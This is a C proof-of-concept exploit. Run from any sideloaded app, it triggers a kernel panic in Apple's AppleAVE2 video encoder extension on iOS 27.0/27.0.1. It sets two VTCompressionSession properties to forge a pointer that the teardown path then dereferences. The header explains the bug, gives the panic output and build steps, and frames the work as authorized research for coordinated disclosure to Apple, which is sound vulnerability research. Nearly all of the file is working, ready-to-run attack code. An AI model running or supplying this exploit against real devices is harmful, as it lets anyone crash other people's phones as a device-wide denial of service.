/*
 * panicIDK.c — app-reachable kernel panic PoC for AppleAVE2 (iOS 27.0 / 27.0.1)
 *
 * Two ordinary VTCompressionSession properties arm a kernel-side reference-count
 * fill loop in AppleAVE2 913.43. The loop's bound is composed by the kext (NOT the
 * value the plugin marshals) and drives a ~51KB linear fill of a small constant
 * across the session allocation, forging the surface-pool pointer
 * pcaSurfacePool[0] = 0x0000000100000001. When the session is invalidated, the
 * teardown path dereferences the forged pointer:
 *
 *   AVE_Client_Destroy -> AVE_Client_UninitSurfacePool ->
 *     SliceRefParams reset -> InitList(forged + 0x58) -> kernel data abort
 *
 * Receipt (identical across boots):
 *   panic: "Kernel data abort. at pc 0x... (AppleAVE2+0xDA78)"
 *   far:  0x0000000100000059    x19: 0x0000000100000001
 *
 * Crash oracle only (device-wide DoS). Authorized research on the owner's devices,
 * for coordinated disclosure to Apple. Do not run on devices you do not own.
 *
 * Build (iOS, run from any sideloaded app process; videocodecd hosts the encoder):
 *   xcrun -sdk iphoneos clang -arch arm64 -o panicIDK panicIDK.c \
 *       -framework VideoToolbox -framework CoreMedia -framework CoreVideo \
 *       -framework CoreFoundation
 * (codesign + sideload; or drop the file into any app target and call panicIDK_main())
 *
 * Compile-check on macOS: change iphoneos -> macosx (the macOS AVE path differs;
 * it will NOT panic there — this is an iOS AppleAVE2 913.43 bug).
 */

#include <CoreFoundation/CoreFoundation.h>
#include <VideoToolbox/VideoToolbox.h>
#include <CoreMedia/CoreMedia.h>
#include <CoreVideo/CoreVideo.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static OSStatus set_i64(VTCompressionSessionRef s, const char *key, int64_t v)
{
    CFStringRef k = CFStringCreateWithCString(NULL, key, kCFStringEncodingUTF8);
    if (!k) return coreFoundationUnknownErr;
    CFNumberRef n = CFNumberCreate(NULL, kCFNumberSInt64Type, &v);
    OSStatus st = n ? VTSessionSetProperty(s, k, n) : coreFoundationUnknownErr;
    if (n) CFRelease(n);
    CFRelease(k);
    return st;
}

static void on_output(void *ctx, void *fs, OSStatus st, VTEncodeInfoFlags fl,
                      CMSampleBufferRef sb)
{
    (void)ctx; (void)fs; (void)fl; (void)sb;
    fprintf(stderr, "output callback: status=%d\n", (int)st);
}

int panicIDK_main(void)
{
    VTCompressionSessionRef s = NULL;
    OSStatus st = VTCompressionSessionCreate(NULL, 128, 128, kCMVideoCodecType_HEVC,
                                             NULL, NULL, NULL, on_output, NULL, &s);
    if (st != noErr || !s) { fprintf(stderr, "create: %d\n", (int)st); return 1; }

    /* --- THE RECIPE: two plain FIG properties that arm the kernel loop --- */
    st = set_i64(s, "EncoderUsage", 1);   /* usage mode 1 (required with eRCMode 0x14) */
    fprintf(stderr, "EncoderUsage = 1        -> %d\n", (int)st);
    st = set_i64(s, "RCMode", 20);        /* eRCMode 0x14: the SVE sequential-RC config  */
    fprintf(stderr, "RCMode = 20             -> %d\n", (int)st);

    /* the kext-side session init runs here; the fill loop fires with the
       kext-composed constant bound, forging pcaSurfacePool[0] */
    st = VTCompressionSessionPrepareToEncodeFrames(s);
    fprintf(stderr, "prepare                 -> %d\n", (int)st);

    /* one tiny frame so the session fully engages the encode path */
    size_t bpr = 128 * 4, len = bpr * 128;
    uint8_t *buf = malloc(len);
    if (buf) memset(buf, 0x42, len);
    CVPixelBufferRef pb = NULL;
    if (buf) CVPixelBufferCreateWithBytes(NULL, 128, 128, kCVPixelFormatType_32BGRA,
                                          buf, bpr, NULL, NULL, NULL, &pb);
    if (pb) {
        st = VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(0, 600),
                                             CMTimeMake(1, 600), NULL, NULL, NULL);
        fprintf(stderr, "encode                  -> %d\n", (int)st);
        VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
    }

    fprintf(stderr, "tearing down: AVE_Client_Destroy derefs the forged pool ptr...\n");
    if (pb) CVBufferRelease(pb);
    free(buf);
    VTCompressionSessionInvalidate(s);   /* <- kernel panic fires in the destroy path */
    CFRelease(s);
    fprintf(stderr, "still alive? (no panic => this kext is not 913.43-shaped)\n");
    return 0;
}

#ifndef PANICIDK_LIBRARY
int main(void) { return panicIDK_main(); }
#endif
